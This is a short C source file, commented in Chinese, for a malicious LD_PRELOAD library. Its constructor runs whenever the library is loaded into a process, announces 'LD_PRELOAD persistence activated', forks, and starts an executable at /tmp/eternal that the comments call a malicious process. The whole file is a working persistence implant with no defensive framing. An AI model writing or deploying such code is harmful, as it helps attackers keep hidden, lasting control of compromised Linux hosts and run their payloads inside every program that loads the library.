#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 初始化函数，在库加载时执行
__attribute__((constructor)) void init() {
    printf("LD_PRELOAD 持久化已激活。\n");
    // 执行持久化逻辑，例如启动恶意进程
    if (fork() == 0) {
        // 子进程，执行恶意进程
        execl("/tmp/eternal", "eternal", NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    }
}
